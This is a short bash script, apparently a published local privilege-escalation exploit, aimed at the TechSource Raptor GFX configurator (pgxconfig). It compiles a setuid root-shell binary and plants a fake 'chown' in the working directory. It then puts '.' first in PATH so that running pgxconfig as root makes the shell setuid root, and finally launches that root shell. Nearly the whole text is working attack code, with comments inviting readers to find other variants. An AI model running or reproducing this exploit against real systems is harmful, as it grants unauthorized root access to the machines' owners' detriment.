#!/usr/local/bin/bash

        # TechSource Raptor GFX configurator root exploit
        # suid@suid.kg

        # unfortunately a compiler must be installed to use this example
        # exploit. however there's a million ways around this you know
        
        # on my system , gcc isnt in my path
        PATH=$PATH:/usr/local/bin

        # build a little prog nothing new here folks
        echo '#include<stdio.h>' > ./x.c
        echo 'int main(void) { setuid(0); setgid(0); execl
("/bin/sh", "/bin/sh", "-i",0);}' >> ./x.c
        gcc x.c -o foobar
        rm -f ./x.c

        # build a substitute chown command. i much prefer this over
        # regular chown
        echo "#!/bin/sh" > chown
        echo "/usr/bin/chown root ./foobar" >> chown
        echo "/usr/bin/chmod 4755 ./foobar" >> chown
        chmod 0755 chown

        # oooh look its the magical fairy path variable
        export PATH=.:$PATH
        
        # heres one way to skin a cat
        # (theres more, some need valid devices. excercise for the readers)
        /usr/sbin/pgxconfig -i
        rm -f chown

        ./foobar


